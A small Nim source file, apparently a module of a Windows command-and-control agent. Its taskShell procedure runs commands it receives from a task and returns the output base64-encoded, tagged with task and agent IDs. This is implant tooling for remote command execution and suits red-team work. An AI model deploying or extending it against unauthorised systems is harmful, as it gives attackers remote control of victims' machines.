import winim, osproc, strutils, strformat, base64

import ../types

proc taskShell*(task: Task): TaskResult = 

    echo "Executing command: ", task.args.join(" ")

    try: 
        let (output, status) = execCmdEx(task.args.join(" ")) 
        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(output),
            status: Completed 
        )

    except CatchableError as err: 
        return TaskResult(
            task: task.id, 
            agent: task.agent, 
            data: encode(fmt"An error occured: {err.msg}" & "\n"),
            status: Failed 
        )
